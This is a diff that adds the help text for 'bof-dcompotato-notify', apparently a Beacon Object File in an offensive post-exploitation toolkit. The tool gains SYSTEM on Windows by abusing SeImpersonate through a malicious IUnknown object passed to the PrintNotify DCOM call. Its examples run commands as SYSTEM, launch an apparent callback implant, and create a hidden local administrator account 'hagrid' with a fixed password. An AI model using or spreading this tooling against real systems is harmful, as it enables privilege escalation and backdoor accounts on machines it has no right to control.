@@ -1,0 +1,24 @@
+ABOUT
+    Obtains SYSTEM privilege with SeImpersonate by passing a malicious
+    IUnknown object to the PrintNotify DCOM call.
+USAGE:
+    bof-dcompotato-notify --- [--pprog <program>] [--pargs <arguments>] [--pmode <mode>]
+
+ARGUMENTS:
+    --pprog             Program to launch (default: cmd.exe)
+    --pargs             Command line arguments to pass to the program
+    --pmode             Process creation API: 1 CreateProcessWithTokenW (default),
+                        2 CreateProcessAsUser, 3 NetUserAdd (creates local admin hagrid)
+
+EXAMPLES:
+    bof-dcompotato-notify --- --pargs /c whoami /all > C:\temp\whoami.txt
+    bof-dcompotato-notify --- --pargs /c net user hagrid P@ssw0rd /add --pmode 2
+    bof-dcompotato-notify --- --pprog C:\temp\callback.exe
+    bof-dcompotato-notify --- --pmode 3
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    bof-dcompotato-notify -w 60 --- --pargs /c whoami /all > C:\temp\whoami.txt
